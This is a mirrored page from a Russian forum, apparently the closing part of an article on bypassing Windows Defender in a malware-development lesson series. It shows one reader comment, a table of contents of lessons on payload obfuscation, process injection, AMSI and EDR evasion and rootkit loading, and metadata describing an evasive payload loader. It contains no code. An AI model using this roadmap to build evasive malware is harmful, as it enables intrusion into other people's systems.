			<img src="../../../../data/avatars/s/0/1026af6.jpg?1756734897" srcset="/data/avatars/m/0/102.jpg?1756734897 2x" alt="HMCoba" class="avatar-u102-s" width="48" height="48" loading="lazy" itemprop="image" /> 
		</a>
			</div>
		</div>
		<span class="message-userArrow"></span>
	</header>

			</div>
			<div class="message-cell message-cell--main">
				<div class="js-quickEditTarget">
					<div class="message-content js-messageContent">
						<header class="message-attribution message-attribution--plain">
							<ul class="listInline listInline--bullet">
								<li class="message-attribution-user">
									<a href="https://osint42.org/members/hmcoba.102/" class="avatar avatar--xxs" data-user-id="102" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1026af6.jpg?1756734897"  alt="HMCoba" class="avatar-u102-s" width="48" height="48" loading="lazy" /> 
		</a>
									<h4 class="attribution"><a href="https://osint42.org/members/hmcoba.102/" class="username " dir="auto" data-user-id="102" data-xf-init="member-tooltip"><span class="username--style2">HMCoba</span></a></h4>
								</li>
								<li>
									<a href="../../../comments/27/index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-16T14:27:08+0300" data-timestamp="1750073228" data-date="16.06.2025" data-time="14:27" data-short="16 Июн" title="16.06.2025 в 14:27">16.06.2025</time></a>
								</li>
							</ul>
						</header>

						
						
						

						<div class="message-userContent lbContainer js-lbContainer"
							data-lb-id="ams-comment-27"
							data-lb-caption-desc="HMCoba &middot; 16.06.2025 в 14:27">

							<article class="message-body js-selectToQuote">
								<div class="bbWrapper">Отличный заход в тему Red Team. <br />
Такие статьи важны для практического понимания атакующих техник. <br />
Акцент на MDLC и реальное применение - то, чего часто не хватает. <br />
Буду следить за серией.</div>
								<div class="js-selectToQuoteEnd">&nbsp;</div>
							</article>

							
						</div>

						

						
							
	
		
			<aside class="message-signature">
			
				<div class="bbWrapper">HMCoba</div>
			
			</aside>
		
	

						
					</div>

					<footer class="message-footer">
						

						<div class="reactionsBar js-reactionsList is-active">
							
	
	
		<ul class="reactionSummary">
		
			<li><span class="reaction reaction--small reaction--1" data-reaction-id="1"><i aria-hidden="true"></i><img src="../../../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f44d.png" loading="lazy" width="64" height="64" class="reaction-image reaction-image--emoji js-reaction" alt="Like" title="Like" /></span></li>
		
		</ul>
	


<span class="u-srOnly">Реакции:</span>
<a class="reactionsBar-link" href="../../../comments/27/reactions.html" data-xf-click="overlay" data-cache="false" rel="nofollow"><bdi>Marat</bdi></a>
						</div>
					</footer>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</div>
			</div>
		</div>
	</article>

						
					
				
			</div>
		</div>

		<div class="block-outer block-outer--after">
			
			
		</div>

		
	
	

	</div>

	
	
	

	


		</div>
	</div>	



	



		







	



	




	
</div>
					
				</div>

				
					<div class="p-body-sidebar">
						
						
							<div class="block">
			<div class="block-container">
				<h3 class="block-header">ОГЛАВЛЕНИЕ</h3>
				<div class="block-body">
					<a class="blockLink " href="../../index.html">
						
							Зачем изучать разработку вредоносных программ ?
						
					</a>

					
						<a href="../instrumenty.1/index.html" class="blockLink ">
							 Инструменты</a>
					
						<a href="../tak-kakoi-zhe-yazyk-vybrat.2/index.html" class="blockLink ">
							 Так какой-же язык выбрать !?</a>
					
						<a href="../shpargalka-po-arkhitekture-vindy.3/index.html" class="blockLink ">
							 Шпаргалка по архитектуре винды</a>
					
						<a href="../chto-takoye-payload-i-shell-code.5/index.html" class="blockLink ">
							 Что такое payload и shell code</a>
					
						<a href="../izuchayem-dinamicheskiye-biblioteki.6/index.html" class="blockLink ">
							 Изучаем динамические библиотеки</a>
					
						<a href="../protsessy-windows.7/index.html" class="blockLink ">
							 Процессы Windows</a>
					
						<a href="../vidy-detektov.8/index.html" class="blockLink ">
							 Виды детектов</a>
					
						<a href="../kuda-klast-nagruzku.9/index.html" class="blockLink ">
							 Куда класть нагрузку ?</a>
					
						<a href="../shifruyem-payload.10/index.html" class="blockLink ">
							 Шифруем Payload</a>
					
						<a href="../obfuskatsiya-payload.11/index.html" class="blockLink ">
							 Обфускация Payload</a>
					
						<a href="../lokal-nyi-zapusk-payload.12/index.html" class="blockLink ">
							 Локальный запуск Payload</a>
					
						<a href="../in-yektsiya-v-protsess.13/index.html" class="blockLink ">
							 Иньекция в процесс</a>
					
						<a href="../in-yektsiya-shell-koda-v-protsess.14/index.html" class="blockLink ">
							 Инъекция шелл-кода в процесс</a>
					
						<a href="../razmeshchayem-payload-udalenno-na-servere.15/index.html" class="blockLink ">
							 Размещаем Payload удаленно на сервере</a>
					
						<a href="../pryachem-payload-v-reyestre.16/index.html" class="blockLink ">
							 Прячем Payload в реестре</a>
					
						<a href="../razborka-s-tsifrovoi-podpis-yu-zver-ka.17/index.html" class="blockLink ">
							 Разборка с цифровой подписью зверька</a>
					
						<a href="../izuchayem-tekhniku-thread-hijacking.18/index.html" class="blockLink ">
							 Изучаем технику Thread Hijacking</a>
					
						<a href="../opredeleniye-pid-nuzhnogo-protsessa-ili-perechisleniya-protsessov.19/index.html" class="blockLink ">
							 Определение PID нужного процесса, или перечисления процессов</a>
					
						<a href="../izuchayem-tekhniku-apc-injection.20/index.html" class="blockLink ">
							 Изучаем технику APC Injection</a>
					
						<a href="../vyzov-koda-cherez-funktsii-obratnogo-vyzova.21/index.html" class="blockLink ">
							 Вызов кода через функции обратного вызова</a>
					
						<a href="../in-yektsiya-otobrazhayemoi-pamyati.22/index.html" class="blockLink ">
							 Инъекция отображаемой памяти</a>
					
						<a href="../izuchayem-tekhniku-stomping-injection.23/index.html" class="blockLink ">
							 Изучаем технику Stomping Injection</a>
					
						<a href="../kontrol-vypolneniya-poleznoi-nagruzki.24/index.html" class="blockLink ">
							 Контроль выполнения полезной нагрузки</a>
					
						<a href="../izuchayem-tekhniku-spoofing.25/index.html" class="blockLink ">
							 Изучаем технику Spoofing</a>
					
						<a href="../skrytiye-strok.26/index.html" class="blockLink ">
							 Скрытие строк</a>
					
						<a href="../izuchayem-kungfu-1-skrytiye-tablitsy-importa.27/index.html" class="blockLink ">
							 Изучаем кунгфу-1. Скрытие таблицы импорта</a>
					
						<a href="../kungfu-2-izuchayem-api-hooking.28/index.html" class="blockLink ">
							 Кунгфу-2.Изучаем API Hooking</a>
					
						<a href="../predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="blockLink ">
							 Предельная техника. Разборка с сисколами</a>
					
						<a href="../predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html" class="blockLink ">
							 Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</a>
					
						<a href="../cherpayem-sily-v-antiotladke.31/index.html" class="blockLink ">
							 Черпаем силы в антиотладке</a>
					
						<a href="../obkhod-virtual-nykh-mashin.32/index.html" class="blockLink ">
							 Обход виртуальных машин</a>
					
						<a href="../otkryvayem-vrata-ada.33/index.html" class="blockLink ">
							 Открываем врата ада</a>
					
						<a href="../umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="blockLink ">
							 Уменьшение вероятности детекта зверька</a>
					
						<a href="index.html" class="blockLink is-selected">
							 Обход Windows defender</a>
					
						<a href="../pro-endpoint-detection-and-response-edr.36/index.html" class="blockLink ">
							 Про Endpoint Detection and Response (EDR)</a>
					
						<a href="../pro-detekt-v-pamyati-nichego-ne-podelayesh-i-eto-neizbezhno.37/index.html" class="blockLink ">
							 Про детект в памяти. Ничего не поделаешь и это неизбежно)</a>
					
						<a href="../ogromnaya-baza-iskhodnikov-sovremennykh-virusov-dlya-raznykh-platform.38/index.html" class="blockLink ">
							 Огромная база исходников современных вирусов для разных платформ</a>
					
						<a href="../kak-rootkit-zagruzit-ili-zhe-kak-zagruzit-draiver-bez-podpisi.39/index.html" class="blockLink ">
							 Как RootKit загрузить или же как загрузить драйвер без подписи</a>
					
						<a href="../obkhod-amsi.40/index.html" class="blockLink ">
							 Обход AMSI</a>
					
						<a href="../obkhod-amsi-pri-pomoshchi-khardvarnykh-tochek-ostanova.41/index.html" class="blockLink ">
							 Обход AMSI при помощи хардварных точек останова</a>
					
						<a href="../uklonyayemsya-ot-povedencheskogo-detekta-antivirusa-i-edr.42/index.html" class="blockLink ">
							 Уклоняемся от поведенческого детекта антивируса и EDR</a>
					
						<a href="../obkhodim-antivirusy-i-edr.43/index.html" class="blockLink ">
							 Обходим антивирусы и EDR</a>
					
						<a href="../mutationgate-novyi-podkhod-raboty-s-siskolami.44/index.html" class="blockLink ">
							 MutationGate - Новый подход работы с сисколами</a>
					
						<a href="../razrabotka-nastoyashchego-virusa-v-2024-godu.45/index.html" class="blockLink ">
							 Разработка настоящего вируса в 2024 году</a>
					

					
						<a href="../../index9401.html?full=1" class="blockLink ">Просмотреть всю статью</a>
					
				</div>
			</div>
		</div>
						
							<div class="block">
		<div class="block-container">
			<h3 class="block-minorHeader">Информация о статье</h3>
			<div class="block-body block-row block-row--minor">
				<dl class="pairs pairs--justified">
					<dt>Автор</dt>
					
						<dd><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></dd>
					
				</dl>
				
					<dl class="pairs pairs--justified">
						<dt>Просмотры</dt>
						<dd>9 577</dd>
					</dl>
				
				
					<dl class="pairs pairs--justified">
						<dt>Комментарии</dt>
						<dd>2</dd>
					</dl>
				
				
				
					<dl class="pairs pairs--justified">
						<dt>Последнее обновление</dt>
						<dd><time  class="u-dt" dir="auto" datetime="2025-05-09T16:44:30+0300" data-timestamp="1746798270" data-date="09.05.2025" data-time="16:44" data-short="9 Май" title="09.05.2025 в 16:44">09.05.2025</time></dd>
					</dl>
				
				
				

				
			</div>
		</div>
	</div>
						
							<div class="block">
			<div class="block-container">
				<h3 class="block-minorHeader"><a href="../../../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html">Больше в Уроки разработки вредоносного софта</a></h3>
				<div class="block-body block-row">
					<ul class="articleSidebarList">
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../obkhod-antivirusov-cherez-uyazvimyi-draiver.71/index.html">Обход антивирусов через уязвимый драйвер</a>

			
			
			<div class="contentRow-snippet">
				Пока хакер не прикрыли, из-за дурацких законов, решил скопировать приватную статью.

Вот...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../unichtozhayem-signaturnyye-antivirusy.57/index.html">Уничтожаем сигнатурные антивирусы</a>

			
			
			<div class="contentRow-snippet">
				Когда-то давно такие тулзы были популярны, возможно и сейчас будет находкой, кто занимается...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../skrytoye-upravleniye-komp-yuterom-na-windows-adovaya-stat-ya.56/index.html">Скрытое управление компьютером на Windows, адовая статья</a>

			
			
			<div class="contentRow-snippet">
				Статья не новая, нашел на старом форуме, но не плохо описано всё.

Возможно какие-то команды...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../memorymodule-zagruzka-dll-iz-ozu.22/index.html">MemoryModule - Загрузка DLL из ОЗУ</a>

			
			
			<div class="contentRow-snippet">
				Когда-то давно писал свой загрузчик DLL, но сейчас на гитхабе наткнулся на более взрослый...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../pro-botnet-i-kak-delat-nel-zya.16/index.html">Про ботнет и как делать нельзя</a>

			
			
			<div class="contentRow-snippet">
				Когда-то давно участвовал в конкурсе статей на xss.is, мы решили для конкурса сделать ботнет...
			</div>				

			
		</div>
	</div>

						</li>
					
					</ul>
				</div>
			</div>
		</div>
						
							<div class="block">
			<div class="block-container">
				
					<h3 class="block-minorHeader"><a href="../../../authors/0x42.1/index.html">Больше от 0x42</a></h3>
				

				<div class="block-body block-row">
					<ul class="articleSidebarList">
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../o-tom-kak-boryut-sya-s-tor-v-rf.75/index.html">О том как борются с TOR в РФ</a>

			
			
			<div class="contentRow-snippet">
				Недавно решил поддержать проект TOR, решил поднять middle relay.

Напомню, что для поддержки...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../bezumnyi-maks-skam.74/index.html">Безумный МАКС/СКАМ</a>

			
			
			<div class="contentRow-snippet">
				По телевизору передают, что мессенджер МАКС полюбили россияне, зарегистрировалось почти вся...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../pochemu-v-linux-vse-fail.73/index.html">Почему в Linux всё — файл?</a>

			
			
			<div class="contentRow-snippet">
				---

## 🔹 Оглавление

[1. Философия UNIX: «Everything is a file»]
[2. Как работает VFS — Virtual...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../zashchita-ot-roskomnadzora.70/index.html">Защита от Роскомнадзора</a>

			
			
			<div class="contentRow-snippet">
				В связи с тем-что РКН внедрили ботов для автоматического поиска неугодного контента и...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../uyazvimosti-v-bash-skriptakh.69/index.html">Уязвимости в bash скриптах</a>

			
			
			<div class="contentRow-snippet">
				Вот кто хоть раз интересовался безопасностью, наверное помнят всякие инъекции в php и не...
			</div>				

			
		</div>
	</div>

						</li>
					
					</ul>
				</div>
			</div>
		</div>
						
							<div class="block">
				<div class="block-container">
					
						<h3 class="block-minorHeader">Поделиться этой страницей статьи</h3>
						
							<div class="block-body block-row block-row--separated">
								
									

	

	
		

		<div class="shareButtons shareButtons--iconic" data-xf-init="share-buttons" data-page-url="" data-page-title="" data-page-desc="" data-page-image="">
			<span class="u-anchorTarget" id="_xfUid-1-1758965539"></span>

			

			<div class="shareButtons-buttons">
				
					

					

					

					

					

					

					

					

					
						<a class="shareButtons-button shareButtons-button--email" href="#_xfUid-1-1758965539" data-href="mailto:?subject={title}&amp;body={url}">
							<i class="fa--xf far fa-envelope "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#envelope"></use></svg></i>
							<span>Электронная почта</span>
						</a>
					

					
						<a class="shareButtons-button shareButtons-button--share is-hidden" href="#_xfUid-1-1758965539"
							data-xf-init="web-share"
							data-title="" data-text="" data-url=""
							data-hide=".shareButtons-button:not(.shareButtons-button--share)">

							<i class="fa--xf far fa-share-alt "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#share-alt"></use></svg></i>
							<span>Поделиться</span>
						</a>
					

					
						<a class="shareButtons-button shareButtons-button--link is-hidden" href="#_xfUid-1-1758965539" data-clipboard="{url}">
							<i class="fa--xf far fa-link "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#link"></use></svg></i>
							<span>Ссылка</span>
						</a>
					
				
			</div>
		</div>
	

								
							</div>
						
						
							<div class="block-body block-row block-row--separated">
								
																		
										
	

	

	<div class="shareInput" data-xf-init="share-input" data-success-text="">
		
			<label class="shareInput-label" for="_xfUid-2-1758965539">Копировать BB-код адреса статьи</label>
		
		<div class="inputGroup inputGroup--joined">
			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
				data-xf-init="tooltip" title="Скопировать в буфер обмена">

				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
			</div>
			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[URL=&quot;https://osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/obkhod-windows-defender.35/&quot;]Обход Windows defender[/URL]" id="_xfUid-2-1758965539" />
		</div>
	</div>

									
									
										
	

	

	<div class="shareInput" data-xf-init="share-input" data-success-text="">
		
			<label class="shareInput-label" for="_xfUid-3-1758965539">Копировать BB-код статьи</label>
		
		<div class="inputGroup inputGroup--joined">
			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
				data-xf-init="tooltip" title="Скопировать в буфер обмена">

				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
			</div>
			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[AMS=page, 35][/AMS]" id="_xfUid-3-1758965539" />
		</div>
	</div>

																		
								
							</div>
						
					
				</div>
			</div>
						
						
					</div>
				
			</div>

			
			
	
		<ul class="p-breadcrumbs p-breadcrumbs--bottom"
			itemscope itemtype="https://schema.org/BreadcrumbList">
			
				

				
				

				

				
				
					
					
	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
		<a href="../../../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
			<span itemprop="name">Уроки разработки вредоносного софта</span>
		</a>
		<meta itemprop="position" content="1" />
	</li>

				
			
		</ul>
	

			
		</div>
	</div>

	<footer class="p-footer" id="footer">
		<div class="p-footer-inner">

			<div class="p-footer-row">
				
					<div class="p-footer-row-main">
						<ul class="p-footer-linkList">
							
								
								
									<li>
										
											
											
												<a href="https://osint42.org/misc/style-variation" rel="nofollow"
													class="js-styleVariationsLink"
													data-xf-init="tooltip" title=" Выбор стиля"
													data-xf-click="menu" data-z-index-ref=".u-bottomFixer" role="button" aria-expanded="false" aria-haspopup="true">

													<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Выбор стиля</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
												</a>

												<div class="menu" data-menu="menu" aria-hidden="true">
													<div class="menu-content js-styleVariationsMenu">
														

	
		

	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965539%2C9c7cce9759db13dde4401ae8d2bd6eb4"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="">

		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>

		
			Системный
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965539%2C9c7cce9759db13dde4401ae8d2bd6eb4"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="default">

		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>

		
			Светлый
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965539%2C9c7cce9759db13dde4401ae8d2bd6eb4"
		class="menu-linkRow is-selected"
		rel="nofollow"
		data-xf-click="style-variation" data-variation="alternate">

		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>

		
			Тёмный
		
	</a>

	

	
		
	

													</div>
												</div>
											
										
									</li>
								
								
									<li><a href="../../../../misc/language.html" data-xf-click="overlay"
										data-xf-init="tooltip" title="Выбор языка" rel="nofollow">
										<i class="fa--xf far fa-globe "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#globe"></use></svg></i> Русский (RU)</a></li>
								
							
						</ul>
					</div>
				
				<div class="p-footer-row-opposite">
					<ul class="p-footer-linkList">
						

						
							<li><a href="../../../../threads/pravila-resursa.56/index.html">Условия и правила</a></li>
						

						
							<li><a href="../../../../help/privacy-policy/index.html">Политика конфиденциальности</a></li>
						

						
							<li><a href="../../../../help/index.html">Помощь</a></li>
						

						
							<li><a href="../../../../forums/index.html">Главная</a></li>
						

						<li><a href="../../../../forums/-/index.rss" target="_blank" class="p-footer-rssLink" title="RSS"><span aria-hidden="true"><i class="fa--xf far fa-rss "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#rss"></use></svg></i><span class="u-srOnly">RSS</span></span></a></li>
					</ul>
				</div>
			</div>

			

			
		</div>
	</footer>
</div> <!-- closing p-pageWrapper -->

<div class="u-bottomFixer js-bottomFixTarget">
	
	
</div>

<div class="u-navButtons js-navButtons">
	<a href="javascript:" class="button button--scroll"><span class="button-text"><i class="fa--xf far fa-arrow-left "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#arrow-left"></use></svg></i><span class="u-srOnly">Назад</span></span></a>
</div>


	<div class="u-scrollButtons js-scrollButtons" data-trigger-type="both">
		<a href="#top" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-up "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#arrow-up"></use></svg></i><span class="u-srOnly">Верх</span></span></a>
		
			<a href="#footer" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-down "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#arrow-down"></use></svg></i><span class="u-srOnly">Низ</span></span></a>
		
	</div>



	<form style="display:none" hidden="hidden">
		<input type="text" name="_xfClientLoadTime" value="" id="_xfClientLoadTime" title="_xfClientLoadTime" tabindex="-1" />
	</form>

	





    
    
        
        
            <script type="application/ld+json">
                {
    "@context": "https://schema.org",
    "@type": "CreativeWorkSeries",
    "@id": "https://osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/obkhod-windows-defender.35/",
    "name": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\" | \u041e\u0431\u0445\u043e\u0434 Windows defender",
    "headline": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\" | \u041e\u0431\u0445\u043e\u0434 Windows defender",
    "alternativeHeadline": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\" | \u041e\u0431\u0445\u043e\u0434 Windows defender",
    "description": "\u0412\u0432\u0435\u0434\u0435\u043d\u0438\u0435\n\n\u0414\u043e \u0441\u0438\u0445 \u043f\u043e\u0440 \u0431\u044b\u043b\u043e \u043f\u0440\u043e\u0434\u0435\u043c\u043e\u043d\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u043e \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u043c\u0435\u0442\u043e\u0434\u043e\u0432 \u0438 \u0442\u0435\u0445\u043d\u0438\u043a \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0438 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u0437\u0430\u0433\u0440\u0443\u0437\u0447\u0438\u043a\u0430 payload, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043c\u043e\u0436\u0435\u0442 \u043e\u0431\u0445\u043e\u0434\u0438\u0442\u044c \u0440\u0430\u0437\u043b\u0438\u0447\u043d\u044b\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0437\u0430\u0449\u0438\u0442\u044b \u043e\u0442 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u043e\u0433\u043e \u043a\u043e\u0434\u0430. \u042d\u0442\u0430 \u0441\u0442\u0430\u0442\u044c\u044f \u0431\u0443\u0434\u0435\u0442 \u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c \u043d\u0430\u0434 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435\u043c \u043f\u043e\u043b\u043d\u043e\u0444\u0443\u043d\u043a\u0446\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u043e\u0433\u043e...",
    "dateCreated": "2025-05-09T11:08:29+00:00",
    "dateModified": "2025-05-09T11:08:29+00:00",
    "author": {
        "@type": "Person",
        "name": "0x42"
    },
    "thumbnailUrl": "https://osint42.org/data/attachments/0/261-349618e09682731233d8b759278eac9f.jpg?hash=YO7inFguyb",
    "interactionStatistic": {
        "@type": "InteractionCounter",
        "interactionType": "https://schema.org/LikeAction",
        "userInteractionCount": "0"
    }
}
            </script>
        
    



	
			
	

				
			
		
		
	

</body>

<!-- Mirrored from osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/obkhod-windows-defender.35/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:42:40 GMT -->
</html>









